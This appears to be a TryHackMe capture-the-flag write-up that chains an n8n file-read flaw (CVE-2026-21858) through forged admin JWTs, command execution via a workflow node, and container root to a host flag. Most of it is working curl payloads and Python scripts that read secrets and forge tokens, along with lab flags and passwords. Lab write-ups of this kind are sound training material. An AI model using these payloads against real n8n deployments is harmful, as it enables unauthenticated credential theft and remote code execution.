# TryHackMe - Nightmare v6 (Ni8mare) | Complete Writeup

**Room:** Nightmare v6  
**Category:** AI Sec + Red Team  
**Difficulty:** Insane  
**Points:** 120  
**Author:** r4s4n  
**Date:** May 15, 2026  

---

##  Challenge Description

> *"Most of the orchestrator's doors are locked. One isn't: a public intake at `/form/file-processor`, built to receive form submissions and a little too trusting about what its visitors claim to carry. Begin at the unlocked door. End at the workflow that should not exist, and let it speak."*

This room revolves around exploiting the **Ni8mare vulnerability chain** in the **n8n workflow automation platform** — a series of critical CVEs disclosed in late 2025 / early 2026 that allow unauthenticated attackers to achieve full host compromise.

**Flags:**
-  User flag: `THM{nightmare_just_begun}`
-  Root flag: `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}`

---

##  Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Service Discovery - n8n on Port 5678](#2-service-discovery)
3. [CVE-2026-21858 (Ni8mare) - Unauthenticated File Read](#3-cve-2026-21858-ni8mare)
4. [JWT Token Forgery - Admin Access](#4-jwt-token-forgery)
5. [RCE via Internal Automation Workflow](#5-rce-via-internal-workflow)
6. [Container Privilege Escalation](#6-container-privilege-escalation)
7. [Container Escape - Root Flag](#7-container-escape)
8. [Vulnerability Summary](#8-vulnerability-summary)

---

## 1. Reconnaissance

### Initial Connectivity Check

```bash
ping -c 2 10.112.136.55
# 64 bytes from 10.112.136.55: icmp_seq=1 ttl=62 time=189 ms
```

Target is alive. TTL=62 suggests Linux (64 hops - 2 = 62).

### IPv4 Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.112.136.55
```

Initial results only showed **port 22 (SSH - OpenSSH 9.6p1)**. No web services found on common ports.

### Extended Port Scan (1025-10000)

```bash
nmap -sV -p 1025-10000 --min-rate 5000 10.112.136.55
```

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
5678/tcp open  rrac?   # <- n8n workflow automation!
```

**Port 5678 was hidden in the non-standard range!** This is the default port for n8n.

### IPv6 Investigation

The challenge name "nightmare **v6**" led us to investigate IPv6. The gateway at `172.20.10.1` was running a **DNS resolver** (port 53) accessible via IPv6 link-local address `fe80::886b:dbff:fe66:8564%eth1`. However, this turned out to be a red herring — the real attack surface was the n8n instance on port 5678.

---

## 2. Service Discovery

### Identifying n8n

```bash
curl -s http://10.112.136.55:5678/
```

Response reveals **n8n v1.120.4** — a workflow automation platform running as a Docker container.

```bash
curl -s http://10.112.136.55:5678/rest/settings
```

Key settings discovered:
- `authCookie.secure: true` (HTTPS-only cookies, complicates browser login)
- `userManagement.isInstanceOwnerSetUp: true` (already configured)
- OIDC callback URL points to localhost

### Finding the Vulnerable Endpoint

The challenge description hints at `/form/file-processor`. This is a **Form Trigger webhook** in n8n — the entry point for **CVE-2026-21858**.

```bash
curl -s http://10.112.136.55:5678/form/file-processor
# Returns the n8n form page - endpoint is ACTIVE
```

---

## 3. CVE-2026-21858 (Ni8mare) — Unauthenticated File Read

### Vulnerability Overview

**CVE-2026-21858** (dubbed "Ni8mare" by Cyera Research Labs) is a **CVSS 10.0 critical** vulnerability in n8n versions ≥1.65.0 and <1.121.0.

**Root Cause:** n8n's form webhook handler (`formWebhook()`) calls a file-handling function (`copyBinaryFile()`) **without first validating that the Content-Type is `multipart/form-data`**. 

**Normal flow:**
```
POST /form/xxx with Content-Type: multipart/form-data
→ parseFormData() called
→ req.body.files populated by Formidable (safe, random temp path)
→ copyBinaryFile() reads from temp path
```

**Exploit flow:**
```
POST /form/xxx with Content-Type: application/json
→ parseBody() called instead
→ req.body.files = attacker-controlled JSON object
→ copyBinaryFile() reads from ATTACKER-CONTROLLED filepath!
```

### Step 1: Read /proc/self/environ (Get Secrets)

```bash
curl -s -X POST http://10.112.136.55:5678/form/file-processor \
  -H "Content-Type: application/json" \
  -d '{
    "files": {
      "file": {
        "filepath": "/proc/self/environ",
        "originalFilename": "environ",
        "mimetype": "text/plain",
        "size": 10000
      }
    }
  }'
```

**Response reveals critical environment variables:**
```
N8N_USER_MANAGEMENT_JWT_SECRET=cve-2026-21858-lab-jwt-secret
N8N_ENCRYPTION_KEY=cve-2026-21858-lab-enc-key
HOME=/home/node
```

### Step 2: Read the SQLite Database

```bash
curl -s -X POST http://10.112.136.55:5678/form/file-processor \
  -H "Content-Type: application/json" \
  -d '{
    "files": {
      "file": {
        "filepath": "/home/node/.n8n/database.sqlite",
        "originalFilename": "db.sqlite",
        "mimetype": "application/octet-stream",
        "size": 5000000
      }
    }
  }' -o /tmp/n8n_db.sqlite
```

**Extract admin user from database:**

```python
import sqlite3
conn = sqlite3.connect('/tmp/n8n_db.sqlite')
cur = conn.cursor()
cur.execute('SELECT id, email, password FROM user LIMIT 5')
# Result: ('f52da01b-db1b-4ad5-97d0-2f2ee6332825', 'admin@lab.local', '$2a$10$WzzF...')
```

**Key data obtained:**
- Admin User ID: `f52da01b-db1b-4ad5-97d0-2f2ee6332825`
- Admin Email: `admin@lab.local`
- Admin Password Hash: `$2a$10$WzzFAGQjc2oloWOzhxgpCuiAeX226sFhnMiLBQjFLyBw7WLHN.lGq`

### Step 3: Read n8n Config (Verify Encryption Key)

```bash
curl -s -X POST http://10.112.136.55:5678/form/file-processor \
  -H "Content-Type: application/json" \
  -d '{"files":{"file":{"filepath":"/home/node/.n8n/config","originalFilename":"config","mimetype":"application/json","size":100000}}}'
# Returns: {"encryptionKey": "cve-2026-21858-lab-enc-key"}
```

---

## 4. JWT Token Forgery — Admin Access

### Understanding n8n's JWT Structure

By reading the n8n source code via the file read exploit:

```bash
curl -s -X POST http://10.112.136.55:5678/form/file-processor \
  -H "Content-Type: application/json" \
  -d '{"files":{"file":{"filepath":"/usr/local/lib/node_modules/n8n/dist/auth/auth.service.js","originalFilename":"auth.js","mimetype":"text/plain","size":200000}}}'
```

n8n computes the JWT hash as:
```javascript
createJWTHash({ email, password }) {
    const payload = [email, password].join(':');
    return SHA256(payload).base64.substring(0, 10);
}
```

The JWT payload contains: `{ id, hash, usedMfa, exp, iat }`

### Forging the Admin JWT

```python
import jwt, hashlib, base64, time

user_id = 'f52da01b-db1b-4ad5-97d0-2f2ee6332825'
email = 'admin@lab.local'
password_bcrypt = '$2a$10$WzzFAGQjc2oloWOzhxgpCuiAeX226sFhnMiLBQjFLyBw7WLHN.lGq'
jwt_secret = 'cve-2026-21858-lab-jwt-secret'

# Compute JWT hash: SHA256(email:bcrypt_hash).base64[:10]
payload_str = email + ':' + password_bcrypt
h = hashlib.sha256(payload_str.encode()).digest()
hash_b64 = base64.b64encode(h).decode()[:10]
# hash_b64 = 'aLdQm2XJJK'

now = int(time.time())
token_payload = {
    'id': user_id,
    'hash': hash_b64,
    'usedMfa': False,
    'exp': now + 7 * 24 * 3600,
    'iat': now
}
token = jwt.encode(token_payload, jwt_secret, algorithm='HS256')
```

### Verifying Admin Access

```bash
curl -s http://10.112.136.55:5678/rest/workflows \
  -H "Cookie: n8n-auth=<FORGED_TOKEN>"
# Returns 103 workflows! Admin access confirmed!
```

---

## 5. RCE via Internal Automation Workflow

### Discovering the Hidden Workflow

While browsing the 103 workflows as admin, we spotted:
- **"Internal Automation — DO NOT SHARE"** (workflow ID: `dtcGODz9L699bB7f`)

```python
import requests

r = requests.get('http://10.112.136.55:5678/rest/workflows/dtcGODz9L699bB7f',
    headers={'Cookie': f'n8n-auth={TOKEN}'})
w = r.json()['data']
# Nodes: ['Trigger/n8n-nodes-base.webhook', 'Run/n8n-nodes-base.executeCommand']
# Webhook path: /webhook/secret-webhook
# Command: id
```

This workflow had:
- A **Webhook trigger** at `/webhook/secret-webhook` (publicly accessible, no auth)
- An **Execute Command node** running `id`

### Triggering the Webhook

```bash
curl -s -X POST http://10.112.136.55:5678/webhook/secret-webhook \
  -H "Content-Type: application/json" -d '{}'
# {"exitCode":0,"stderr":"","stdout":"uid=1000 gid=1000(node) groups=1000(node)"}
```

**RCE confirmed as user `node` (uid=1000)!**

### Modifying the Workflow for Arbitrary Commands

```python
def run_command(cmd):
    # Get current workflow
    r = requests.get(f'{BASE}/rest/workflows/{WF_ID}', headers={'Cookie': COOKIE})
    w = r.json()['data']
    
    # Modify executeCommand node
    for node in w['nodes']:
        if node['type'] == 'n8n-nodes-base.executeCommand':
            node['parameters']['command'] = cmd
    
    # Update workflow via PATCH
    payload = {"name": w['name'], "nodes": w['nodes'], "connections": w['connections'],
               "settings": w.get('settings', {}), "staticData": w.get('staticData'),
               "versionId": w.get('versionId')}
    requests.patch(f'{BASE}/rest/workflows/{WF_ID}', json=payload, headers={'Cookie': COOKIE})
    
    # Trigger webhook
    r2 = requests.post(f'{BASE}/webhook/secret-webhook', json={}, headers={'Cookie': COOKIE})
    return r2.json()

# Enumerate the filesystem
print(run_command("ls /"))
# bin  dev  docker-entrypoint.sh  etc  home  HOST-ROOT  lib  lib64  mnt  opt  
# proc  root  run  sbin  setup.sh  srv  sys  tmp  usr  var
```

**Interesting findings:**
- `/host-root` — host OS filesystem mounted in the container!
- `/setup.sh` — container initialization script
- The container is Alpine Linux-based

### Reading the User Flag

```bash
run_command("cat /home/node/flag-user-lfi.txt")
# THM{nightmare_just_begun}
```

---

## 6. Container Privilege Escalation

### Reading setup.sh — Container Root Password

```bash
run_command("cat /setup.sh")
```

```sh
#!/bin/sh
# Fix /etc/passwd in case it was corrupted by a previous exploit run
printf 'root:x:0:0:root:/root:/bin/ash\n...' > /etc/passwd

# Install real su + script + su-exec
apk add --no-cache util-linux util-linux-login su-exec

# Set strong root password
echo 'root:N1ghtm4r3R00t!CTF2026' | chpasswd

# Make /etc/passwd unreadable by non-root — blocks pyroceper
chmod 600 /etc/passwd

# Restore user flag
echo "THM{nightmare_just_begun}" > /home/node/flag-user-lfi.txt
chown 1000:1000 /home/node/flag-user-lfi.txt

# Drop to node user and start n8n
exec su-exec node tini -- /docker-entrypoint.sh
```

**Container root password: `N1ghtm4r3R00t!CTF2026`**

### Verifying Root Access via `su`

```bash
run_command("echo 'N1ghtm4r3R00t!CTF2026' | su -c 'id' root")
# Password: uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),...
```

We have root inside the Docker container!

---

## 7. Container Escape — Root Flag

### Discovering the Host Filesystem Mount

```bash
run_command("stat /host-root")
# File: /host-root
# Access: (0700/drwx------) Uid: (0/root) Gid: (0/root)
# The host's root filesystem is mounted at /host-root!
```

```bash
run_command("echo 'N1ghtm4r3R00t!CTF2026' | su -c 'ls /host-root/' root")
# flag.txt  snap
```

**The root flag is at `/host-root/flag.txt`!**

### Reading the Root Flag

```python
# Write a script that runs as root to read the host-root flag
result = run_command("echo 'N1ghtm4r3R00t!CTF2026' | su -c 'cat /host-root/flag.txt' root")
print(result)
# {'exitCode': 0, 'stderr': 'Password:', 'stdout': 'THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}'}
```

 **Root Flag: `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}`**

---

## 8. Vulnerability Summary

### CVEs Used in This Challenge

| CVE | Name | Type | CVSS | Description |
|-----|------|------|------|-------------|
| **CVE-2026-21858** | Ni8mare | Unauthenticated File Read | 10.0 | Content-Type confusion in form webhook allows arbitrary file read |
| **CVE-2025-68613** | - | Auth RCE via Expression Injection | 9.9 | Sandbox escape in workflow expression evaluation |

### Attack Chain Visualization

```
[Attacker]
    │
    │ POST /form/file-processor (Content-Type: application/json)
    │ {"files": {"file": {"filepath": "/proc/self/environ", ...}}}
    ▼
[n8n CVE-2026-21858]
    │ Reads /proc/self/environ → JWT_SECRET, ENCRYPTION_KEY
    │ Reads /home/node/.n8n/database.sqlite → Admin user ID + bcrypt hash
    │ Reads /home/node/.n8n/config → Encryption key confirmed
    ▼
[JWT Forgery]
    │ Compute hash = SHA256(email:bcrypt_hash).base64[:10]
    │ Sign JWT with N8N_USER_MANAGEMENT_JWT_SECRET
    │ Cookie: n8n-auth=<FORGED_JWT>
    ▼
[Admin Access to n8n]
    │ Discover "Internal Automation — DO NOT SHARE" workflow
    │ Webhook at /webhook/secret-webhook
    │ executeCommand node (RCE as node user)
    ▼
[RCE as node (uid=1000)]
    │ Read /setup.sh → Container root password
    │ echo 'N1ghtm4r3R00t!CTF2026' | su -c 'COMMAND' root
    ▼
[Container Root (uid=0)]
    │ /host-root mounted with mode 0700 (root-only)
    │ cat /host-root/flag.txt
    ▼
[HOST ROOT FLAG! 🏴]
THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}
```

---

##  Tools Used

- `nmap` — Port scanning and service detection
- `curl` — HTTP requests and exploit delivery
- `python3` — SQLite parsing, JWT forgery, automated exploit chain
- `jwt` (PyJWT) — JSON Web Token signing
- `dig` — DNS enumeration

---

##  Key Takeaways

1. **Always scan non-standard port ranges** — port 5678 was missed by common-ports-only scans
2. **Content-Type confusion** is a powerful vulnerability class — never trust client-provided Content-Type headers
3. **JWT secrets in environment variables** should never be discoverable via file read vulnerabilities
4. **Docker containers** running with sensitive host mounts and weak internal passwords are a container escape risk
5. **Hidden workflows** in automation platforms can be dangerous — any `executeCommand` node on a public webhook is effectively a web shell
6. **n8n's Ni8mare** (CVE-2026-21858) is a perfect example of how a "simple" file read can escalate to full host compromise through a chain of weaknesses

---

##  References

- [Cyera Research - Ni8mare Technical Analysis](https://www.cyera.com/research/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858)
- [n8n Security Advisory - CVE-2026-21858](https://blog.n8n.io/security-advisory-20260108/)
- [Rapid7 - Ni8mare and N8scape Flaws](https://www.rapid7.com/blog/post/etr-ni8mare-n8scape-flaws-multiple-critical-vulnerabilities-affecting-n8n/)
- [NVD - CVE-2026-21858](https://nvd.nist.gov/vuln/detail/CVE-2026-21858)
- [NVD - CVE-2025-68613](https://nvd.nist.gov/vuln/detail/CVE-2025-68613)

---

*Writeup by r4s4n | TryHackMe | May 2026*
